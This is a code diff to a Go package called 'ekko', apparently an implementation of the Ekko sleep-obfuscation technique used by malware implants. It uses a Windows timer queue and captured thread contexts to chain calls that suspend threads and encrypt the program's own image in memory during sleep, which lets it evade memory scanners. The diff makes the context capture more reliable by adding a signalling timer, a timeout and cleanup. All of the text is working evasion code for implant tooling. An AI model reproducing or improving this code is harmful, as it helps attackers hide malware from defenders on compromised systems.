@@ -2,7 +2,7 @@ package ekko
 
 import (
 	"crypto/rand"
-	"log"
+	"errors"
 	"runtime"
 	"syscall"
 	"unsafe"
@@ -38,6 +38,7 @@ var (
 	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
 	procSetEvent              = kernel32dll.NewProc("SetEvent")
 	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")
+	procDeleteTimerQueueEx    = kernel32dll.NewProc("DeleteTimerQueueEx")
 
 	//ntdll
 	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
@@ -165,7 +166,6 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	t.Key.Buffer = &t.KeyBuf[0]
 	t.Key.Length = uint32(len(t.KeyBuf))
 
-
 	t.Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
 	t.Img.Length = nt_header.OptionalHeader.SizeOfImage
 
@@ -173,11 +173,19 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	var hNewTimer, hTimerQueue uintptr
 	hTimerQueue, _, _ = procCreateTimerQueue.Call()
 
+	// Capture, then signal. A timer callback receives (param, fired) and SetEvent
+	// only reads the first, so SetEvent can be the callback itself. It's due 1 ms
+	// after the capture, and overdue timers run in due-time order on the one timer
+	// thread, so it fires only after RtlCaptureContext has returned.
+	const captureTimeoutMs = 5000 // generous: the capture normally runs within a few ms
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
-	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)
-
-	if CtxThread.Rip == 0 {
-		log.Fatalln()
+	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procSetEvent.Addr(), hEvent, 1, 0, WT_EXECUTEINTIMERTHREAD)
+	if ev, _ := windows.WaitForSingleObject(windows.Handle(hEvent), captureTimeoutMs); ev != windows.WAIT_OBJECT_0 {
+		// Nothing is suspended or encrypted yet. Wait out any late callback
+		// before the deferred VirtualFree releases the block it writes into.
+		procDeleteTimerQueueEx.Call(hTimerQueue, uintptr(windows.InvalidHandle))
+		windows.CloseHandle(windows.Handle(hEvent))
+		return errors.New("ekko: capture timer didn't run")
 	}
 
 	// The addresses the chain needs, as the plain integers they become in registers.
@@ -228,8 +236,6 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 	return nil
 }
 
-
-
 // step returns a copy of base that calls fn(args...) and then returns into the timer dispatcher.
 func step(base *CONTEXT, fn uintptr, args ...uint64) CONTEXT {
 	c := *base
@@ -264,5 +270,3 @@ func imageRegions(imageBase, imageSize uintptr) ([]region, error) {
 	}
 	return out, nil
 }
-
-
